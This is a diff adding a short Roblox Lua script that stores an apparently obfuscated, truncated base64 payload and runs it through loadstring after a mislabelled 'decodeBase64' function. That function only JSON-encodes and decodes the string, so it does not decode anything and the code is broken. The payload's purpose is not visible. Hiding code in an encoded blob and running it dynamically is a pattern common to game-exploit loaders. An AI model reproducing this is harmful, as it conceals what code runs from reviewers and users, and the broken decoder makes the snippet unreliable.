@@ -1,0 +1,7 @@
+local encodedScript = "bG9jYWwgdWlzID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgdHMgPSBnYW1l...==" -- (Đã mã hóa)
+
+local function decodeBase64(data)
+    return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode(data))
+end
+
+loadstring(decodeBase64(encodedScript))()
